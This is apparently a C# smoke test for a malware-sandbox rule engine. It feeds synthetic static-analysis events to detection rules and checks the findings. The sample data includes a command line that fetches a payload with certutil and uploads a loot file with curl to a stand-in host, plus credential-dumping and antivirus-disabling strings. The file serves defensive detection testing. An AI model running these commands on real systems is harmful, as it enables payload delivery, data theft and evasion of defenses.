using System.Text.Json;
using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies that behavior rules consume structured static-analysis event rows.
/// Inputs are repository rule files; processing parses JSON, checks rule ID
/// uniqueness, classifies synthetic static.pe/static.string/YARA/packer events,
/// and returns pass/fail metadata without running a Hyper-V E2E flow.
/// </summary>
internal sealed class BehaviorRuleStaticEventConsumptionScenario : ISmokeTestScenario
{
    private static readonly string[] ExpectedRuleIds =
    [
        "static-pe-known-packer",
        "static-yara-match-observed",
        "static-pe-high-entropy-sections",
        "static-pe-overlay-noncertificate-data",
        "static-pe-overlay-high-entropy",
        "static-pe-imports-present",
        "static-import-suspicious-api",
        "static-import-process-injection",
        "static-import-network-api",
        "static-import-persistence-api",
        "static-import-anti-analysis-api",
        "static-import-dynamic-code",
        "static-import-script-execution",
        "static-import-file-drop",
        "static-import-resource-api",
        "static-import-registry-persistence",
        "static-import-service-persistence",
        "static-import-download-api",
        "static-import-exfil-api",
        "static-import-credential-access-api",
        "static-import-defense-evasion-api",
        "static-pe-tls-callbacks",
        "static-pe-exports-present",
        "static-export-registration-entrypoint",
        "static-export-service-entrypoint",
        "static-pe-resources-present",
        "static-resource-payload-candidate",
        "static-resource-embedded-pe",
        "static-resource-high-entropy",
        "static-section-writable-executable",
        "static-section-virtual-layout-anomaly",
        "static-pe-signature-metadata-present",
        "static-pe-parse-warning-observed",
        "static-pe-zero-entrypoint",
        "static-embedded-url",
        "static-domain-indicator",
        "static-tor-domain-string",
        "static-dynamic-dns-domain-string",
        "static-ip-address",
        "static-windows-path-string",
        "static-registry-path-string",
        "static-persistence-string",
        "static-script-command-string",
        "static-encoded-command-string",
        "static-lolbin-string",
        "static-download-command-string",
        "static-exfil-command-string",
        "static-credential-access-string",
        "static-defense-evasion-string",
        "static-anti-sandbox-string"
    ];

    private static readonly string[] GranularStaticEventTypes =
    [
        "static.pe.section",
        "static.pe.import.module",
        "static.pe.import.cluster",
        "static.pe.export",
        "static.pe.tls.directory",
        "static.pe.tls.callback",
        "static.pe.resource",
        "static.pe.overlay",
        "static.string.indicator",
        "static.string.path",
        "static.string.command",
        "static.string.suspicious",
        "static.packer.hint",
        "static.yara.match"
    ];

    public string ScenarioId => "behavior.rules-static-event-consumption";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var rulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        SmokeAssert.True(File.Exists(rulesPath), "behavior-rules.json is missing.");
        AssertRulesJsonParsesWithUniqueIds(rulesPath);

        var rules = RuleEngine.LoadRuleSet(rulesPath);
        AssertStaticRuleQuality(rules);

        var engine = new RuleEngine(rules);
        var findings = engine.Classify(BuildStructuredStaticEvents());
        var findingIds = findings
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var ruleId in ExpectedRuleIds)
        {
            SmokeAssert.True(findingIds.Contains(ruleId), $"Structured static events should match '{ruleId}'.");
        }

        AssertStaticTriageBoundary(findings);
        AssertReferenceIndicatorsRemainEvidenceOnly(engine);

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = "Structured static events classify into static triage rules without high-risk primary behavior findings."
        });
    }

    /// <summary>
    /// Parses the behavior rules JSON and checks rule ID uniqueness.
    /// </summary>
    private static void AssertRulesJsonParsesWithUniqueIds(string rulesPath)
    {
        using var document = JsonDocument.Parse(File.ReadAllText(rulesPath));
        SmokeAssert.True(document.RootElement.TryGetProperty("rules", out var rules), "Rules document should contain rules array.");
        SmokeAssert.True(rules.ValueKind == JsonValueKind.Array, "rules should be a JSON array.");

        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var rule in rules.EnumerateArray())
        {
            SmokeAssert.True(rule.TryGetProperty("id", out var idElement), "Each rule should contain id.");
            var id = idElement.GetString();
            SmokeAssert.True(!string.IsNullOrWhiteSpace(id), "Each rule id should be non-empty.");
            SmokeAssert.True(seen.Add(id!), $"Behavior rule id '{id}' should be unique.");
        }
    }

    /// <summary>
    /// Builds representative direct static-analysis events for rule matching.
    /// </summary>
    private static IReadOnlyList<SandboxEvent> BuildStructuredStaticEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "static.pe.section",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["name"] = ".packed",
                    ["virtualAddress"] = "0x1000",
                    ["rawDataOffset"] = "0x400",
                    ["virtualSize"] = "8192",
                    ["rawDataSize"] = "4096",
                    ["entropy"] = "7.912",
                    ["entropyLabel"] = "very_high",
                    ["characteristics"] = "IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE",
                    ["isExecutable"] = "True",
                    ["isWritable"] = "True",
                    ["sectionRole"] = "writable-executable",
                    ["tags"] = "pe_section,high_entropy_section,very_high_entropy_section,writable_executable_section,virtual_only_section,oversized_virtual_section"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.overlay",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["present"] = "True",
                    ["startOffset"] = "0x5000",
                    ["size"] = "2048",
                    ["containsCertificateTable"] = "False",
                    ["certificateTableSize"] = "0",
                    ["isCertificateTableOnly"] = "False",
                    ["nonCertificateSize"] = "2048",
                    ["largestNonCertificateOffset"] = "0x5000",
                    ["largestNonCertificateSize"] = "2048",
                    ["nonCertificateEntropy"] = "5.125",
                    ["tags"] = "overlay_present,pe_overlay,overlay_non_certificate_data"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.overlay",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["present"] = "True",
                    ["startOffset"] = "0x6000",
                    ["size"] = "4096",
                    ["containsCertificateTable"] = "False",
                    ["certificateTableSize"] = "0",
                    ["isCertificateTableOnly"] = "False",
                    ["nonCertificateSize"] = "4096",
                    ["largestNonCertificateOffset"] = "0x6000",
                    ["largestNonCertificateSize"] = "4096",
                    ["nonCertificateEntropy"] = "7.642",
                    ["tags"] = "overlay_present,pe_overlay,overlay_non_certificate_data,overlay_high_entropy"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.import.module",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["moduleName"] = "KERNEL32.dll",
                    ["apiNames"] = "VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,VirtualProtect,URLDownloadToFileW,RegSetValueExW,OpenSCManagerW,FindResourceW,CreateFileW,ShellExecuteW,IsDebuggerPresent,MiniDumpWriteDump,InternetWriteFile,AmsiScanBuffer",
                    ["suspiciousApiNames"] = "VirtualAllocEx,WriteProcessMemory,CreateRemoteThread,VirtualProtect,URLDownloadToFileW,RegSetValueExW,OpenSCManagerW,FindResourceW,CreateFileW,ShellExecuteW,IsDebuggerPresent,MiniDumpWriteDump,InternetWriteFile,AmsiScanBuffer",
                    ["suspiciousApiClusters"] = "process-injection,dynamic-code,download,registry-persistence,service-persistence,resource,file-drop,script-execution,anti-analysis,credential-access,exfiltration,defense-evasion",
                    ["tags"] = "imports_present,import_suspicious_api,import_process_injection_api,import_dynamic_code_api,import_network_api,import_download_api,import_persistence_api,import_registry_persistence_api,import_service_persistence_api,import_resource_api,import_file_drop_api,import_script_execution_api,import_anti_analysis_api,import_credential_access_api,import_exfil_api,import_defense_evasion_api"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.import.cluster",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["cluster"] = "credential-access",
                    ["hitCount"] = "2",
                    ["apiNames"] = "MiniDumpWriteDump,CryptUnprotectData",
                    ["tags"] = "import_suspicious_api_cluster,import_credential_access_api"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.import.cluster",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["cluster"] = "defense-evasion",
                    ["hitCount"] = "2",
                    ["apiNames"] = "AmsiScanBuffer,EtwEventWrite",
                    ["tags"] = "import_suspicious_api_cluster,import_defense_evasion_api"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.export",
                Source = "host",
                Path = "synthetic-static-events.dll",
                Data =
                {
                    ["exportName"] = "DllRegisterServer",
                    ["moduleName"] = "synthetic-static-events.dll",
                    ["tags"] = "exports_present,export_registration_entrypoint"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.export",
                Source = "host",
                Path = "synthetic-static-events.dll",
                Data =
                {
                    ["exportName"] = "ServiceMain",
                    ["moduleName"] = "synthetic-static-events.dll",
                    ["tags"] = "exports_present,export_service_entrypoint"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.tls.directory",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["directoryPresent"] = "True",
                    ["callbackCount"] = "1",
                    ["callbackTableVa"] = "0x140020000",
                    ["callbackTableFileOffset"] = "0x2400",
                    ["tags"] = "tls_directory_present,tls_callbacks"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.tls.callback",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["index"] = "0",
                    ["virtualAddress"] = "0x140010100",
                    ["relativeVirtualAddress"] = "0x10100",
                    ["callbackTableVa"] = "0x140020000",
                    ["callbackTableFileOffset"] = "0x2400",
                    ["tags"] = "tls_directory_present,tls_callback_pointer,tls_callbacks"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "url",
                    ["value"] = "https://payload.example.invalid/stage.bin",
                    ["classification"] = "embedded",
                    ["tags"] = "url,embedded_url,network_indicator_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "domain",
                    ["value"] = "hiddenservice.onion",
                    ["classification"] = "onion",
                    ["tags"] = "domain_string,network_indicator_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "domain",
                    ["value"] = "callback.duckdns.org",
                    ["classification"] = "dynamic_dns",
                    ["tags"] = "domain_string,network_indicator_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "ipv4",
                    ["value"] = "8.8.8.8",
                    ["classification"] = "public",
                    ["tags"] = "ip_address,network_indicator_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.path",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "registry",
                    ["value"] = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KswordSmoke",
                    ["tags"] = "registry_path_string,run_key_path_string,persistence_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.path",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["kind"] = "filesystem",
                    ["value"] = @"C:\Users\Public\ksword-smoke-drop.exe",
                    ["tags"] = "windows_path_string,file_path_string,temp_path_string,executable_path_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.command",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["category"] = "download-command",
                    ["tool"] = "certutil",
                    ["value"] = "powershell -EncodedCommand SQBFAFgA; certutil -urlcache -f https://payload.example.invalid/a.exe a.exe; curl -F file=@loot.bin https://payload.example.invalid/u",
                    ["tags"] = "script_execution_string,encoded_command_string,lolbin_string,download_command_string,exfil_command_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.suspicious",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["category"] = "credential-access-and-defense-evasion",
                    ["value"] = "lsass.exe sekurlsa Set-MpPreference DisableRealtimeMonitoring IsDebuggerPresent VirtualBox",
                    ["tags"] = "credential_access_string,defense_evasion_string,anti_analysis_string,sandbox_evasion_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.analysis.completed",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["fileFormat"] = "PE32+",
                    ["isPe"] = "True",
                    ["machine"] = "0x8664",
                    ["subsystem"] = "Windows GUI",
                    ["entryPointRva"] = "0x00000000",
                    ["sectionCount"] = "5",
                    ["tagCount"] = "4",
                    ["interestingStringCount"] = "4",
                    ["warningCount"] = "1",
                    ["warnings"] = "Synthetic malformed-header warning for static rule smoke coverage.",
                    ["tags"] = "resources_present,resource_payload_candidate,resource_embedded_pe,resource_high_entropy_data,digital_signature_present,authenticode_signature_present,signature_pkcs_signed_data"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.resource",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["resourceType"] = "rcdata",
                    ["dataRva"] = "0x00001580",
                    ["dataFileOffset"] = "0x780",
                    ["size"] = "288",
                    ["entropy"] = "7.612",
                    ["entropyLabel"] = "very_high",
                    ["isPayloadCandidate"] = "True",
                    ["isEmbeddedPe"] = "True",
                    ["payloadCandidate"] = "True",
                    ["resourceRole"] = "embedded-pe",
                    ["tags"] = "resources_present,resource_data_entry,resource_type_rcdata,resource_payload_candidate,resource_embedded_pe,resource_high_entropy_data"
                }
            },
            new SandboxEvent
            {
                EventType = "static.packer.hint",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["tags"] = "packer_upx,packer_string_hint",
                    ["evidence"] = "section:UPX0 | string:UPX!"
                }
            },
            new SandboxEvent
            {
                EventType = "static.yara.match",
                Source = "host",
                Path = "synthetic-static-events.exe",
                Data =
                {
                    ["ruleName"] = "KSwordSandbox_Static_Suspicious_Windows_Apis",
                    ["engine"] = "builtin",
                    ["matchedStringIds"] = "$inject1,$inject2",
                    ["mitre"] = "T1106",
                    ["tags"] = "static.yara.match,static.yara.engine.builtin"
                }
            }
        ];
    }

    /// <summary>
    /// Verifies static rule metadata and concrete event selectors.
    /// </summary>
    private static void AssertStaticRuleQuality(BehaviorRuleSet rules)
    {
        var staticRules = rules.Rules.Where(IsStaticRule).ToList();
        SmokeAssert.True(staticRules.Count > 0, "Behavior rules should include static-analysis rules.");

        foreach (var rule in staticRules)
        {
            SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.Confidence), $"Static rule '{rule.Id}' should declare confidence.");
            SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Static rule '{rule.Id}' should document evidence fields.");
            SmokeAssert.True(rule.EvidenceFields.Contains("eventType", StringComparer.OrdinalIgnoreCase), $"Static rule '{rule.Id}' evidence should include eventType.");
            SmokeAssert.True(rule.EvidenceFields.Contains("path", StringComparer.OrdinalIgnoreCase), $"Static rule '{rule.Id}' evidence should include path.");
            SmokeAssert.True(!rule.EventTypes.Contains("static.*", StringComparer.OrdinalIgnoreCase), $"Static rule '{rule.Id}' should prefer concrete static event types over static.*.");
        }

        foreach (var eventType in GranularStaticEventTypes)
        {
            var consumers = staticRules
                .Where(rule => rule.EventTypes.Contains(eventType, StringComparer.OrdinalIgnoreCase))
                .ToList();
            SmokeAssert.True(consumers.Count > 0, $"Granular static event type '{eventType}' should have a behavior-rule consumer.");
            SmokeAssert.True(consumers.All(rule => rule.EvidenceFields.Count > 0), $"Consumers of '{eventType}' should document evidence fields.");
        }

        var yaraConsumers = staticRules
            .Where(rule => rule.EventTypes.Contains("static.yara.match", StringComparer.OrdinalIgnoreCase))
            .ToList();
        var genericYaraConsumers = yaraConsumers
            .Where(rule => string.Equals(rule.Id, "static-yara-match-observed", StringComparison.OrdinalIgnoreCase))
            .ToList();
        SmokeAssert.True(
            genericYaraConsumers.Count == 1,
            "static.yara.match should have exactly one generic consumer to avoid duplicate YARA findings.");
        SmokeAssert.True(
            yaraConsumers
                .Where(rule => !string.Equals(rule.Id, "static-yara-match-observed", StringComparison.OrdinalIgnoreCase))
                .All(rule => rule.Tags.Contains("structured-static", StringComparer.OrdinalIgnoreCase) && rule.DataContains.Count > 0),
            "Additional static.yara.match consumers must be constrained structured-static capability rules.");

        var processInjectionRule = staticRules.Single(rule => string.Equals(rule.Id, "static-import-process-injection", StringComparison.OrdinalIgnoreCase));
        SmokeAssert.True(string.Equals(processInjectionRule.MitreTechniqueId, "T1055", StringComparison.OrdinalIgnoreCase), "Static process-injection imports should map to MITRE T1055.");

        var overlayHighEntropyRule = staticRules.Single(rule => string.Equals(rule.Id, "static-pe-overlay-high-entropy", StringComparison.OrdinalIgnoreCase));
        SmokeAssert.True(string.Equals(overlayHighEntropyRule.MitreTechniqueId, "T1027", StringComparison.OrdinalIgnoreCase), "High-entropy static overlay evidence should map to MITRE T1027.");
    }

    private static bool IsStaticRule(BehaviorRule rule)
    {
        return rule.Id.StartsWith("static-", StringComparison.OrdinalIgnoreCase) ||
            rule.EventTypes.Any(eventType => eventType.StartsWith("static.", StringComparison.OrdinalIgnoreCase)) ||
            rule.Tags.Contains("static", StringComparer.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Ensures direct static event findings stay static-only and non-high.
    /// </summary>
    private static void AssertStaticTriageBoundary(IReadOnlyList<BehaviorFinding> findings)
    {
        SmokeAssert.True(findings.Count > 0, "Structured static events should produce findings.");

        var nonStatic = findings
            .Where(finding =>
                !finding.RuleId.StartsWith("static-", StringComparison.OrdinalIgnoreCase) &&
                !finding.Tags.Contains("static", StringComparer.OrdinalIgnoreCase))
            .Select(finding => finding.RuleId)
            .Order(StringComparer.OrdinalIgnoreCase)
            .ToList();
        SmokeAssert.True(nonStatic.Count == 0, "Structured static events should not trigger non-static behavior rules: " + string.Join(", ", nonStatic));

        var highRisk = findings
            .Where(finding =>
                string.Equals(finding.Severity, "high", StringComparison.OrdinalIgnoreCase) ||
                string.Equals(finding.Severity, "critical", StringComparison.OrdinalIgnoreCase))
            .Select(finding => finding.RuleId)
            .Order(StringComparer.OrdinalIgnoreCase)
            .ToList();
        SmokeAssert.True(highRisk.Count == 0, "Structured static-only events should not produce high/critical findings: " + string.Join(", ", highRisk));
    }

    /// <summary>
    /// Verifies reference-only structured string indicators stay evidence-only.
    /// </summary>
    private static void AssertReferenceIndicatorsRemainEvidenceOnly(RuleEngine engine)
    {
        var findings = engine.Classify(
        [
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "reference-only.exe",
                Data =
                {
                    ["kind"] = "url",
                    ["value"] = "https://schemas.microsoft.com/winfx/2006/xaml",
                    ["classification"] = "reference",
                    ["tags"] = "url,embedded_url,network_indicator_string"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.indicator",
                Source = "host",
                Path = "reference-only.exe",
                Data =
                {
                    ["kind"] = "domain",
                    ["value"] = "docs.example.invalid",
                    ["classification"] = "reference",
                    ["tags"] = "domain_string,network_indicator_string"
                }
            }
        ]);

        var findingIds = findings.Select(finding => finding.RuleId).ToHashSet(StringComparer.OrdinalIgnoreCase);
        SmokeAssert.True(!findingIds.Contains("static-embedded-url"), "Reference-only URL strings should not trigger embedded URL triage.");
        SmokeAssert.True(!findingIds.Contains("static-domain-indicator"), "Reference-only domain strings should not trigger domain indicator triage.");
    }
}
